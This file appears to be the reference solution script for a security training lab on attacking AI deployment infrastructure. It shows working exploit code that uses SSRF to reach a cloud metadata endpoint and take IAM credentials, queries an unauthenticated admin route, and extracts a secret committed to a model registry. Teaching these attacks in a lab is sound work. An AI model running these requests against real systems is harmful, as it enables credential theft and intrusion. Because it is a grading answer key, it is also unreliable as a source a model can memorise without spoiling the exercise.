"""Reference solution for Module 09 -- AI Infrastructure & Deployment Exploits."""
from __future__ import annotations

import json
import re

import httpx


def _flag(blob) -> str | None:
    m = re.search(r"REDSEC\{[^}]+\}", json.dumps(blob) if not isinstance(blob, str) else blob)
    return m.group(0) if m else None


def solve(endpoints: dict[str, str], drop_url: str | None) -> dict:
    app = endpoints["appserver"].rstrip("/")
    flags: dict[str, str] = {}

    # metadata-ssrf: first discover the internal metadata address (recon leak),
    # then make the appserver SSRF to it. We use the appserver-reachable internal
    # URL -- NOT our own host view -- so this works in containers/k8s too.
    cfg = httpx.get(f"{app}/debug/config", timeout=10).json()
    meta = cfg["internal_endpoints"]["metadata"].rstrip("/")
    r = httpx.post(f"{app}/fetch",
                   json={"url": f"{meta}/latest/meta-data/iam/security-credentials/role"},
                   timeout=15).json()
    if f := _flag(r):
        flags["metadata-ssrf"] = f

    # open-inference-api: unauthenticated admin route.
    r = httpx.get(f"{app}/v1/admin", timeout=10).json()
    if f := _flag(r):
        flags["open-inference-api"] = f

    # registry-secrets: committed secret in a model card.
    name = httpx.get(f"{app}/registry/models", timeout=10).json()["models"][0]
    r = httpx.get(f"{app}/registry/models/{name}/MLmodel", timeout=10).json()
    if f := _flag(r):
        flags["registry-secrets"] = f

    return {"flags": flags}


if __name__ == "__main__":  # pragma: no cover
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--appserver", required=True)
    a = ap.parse_args()
    print(json.dumps(solve({"appserver": a.appserver}, None), indent=2))
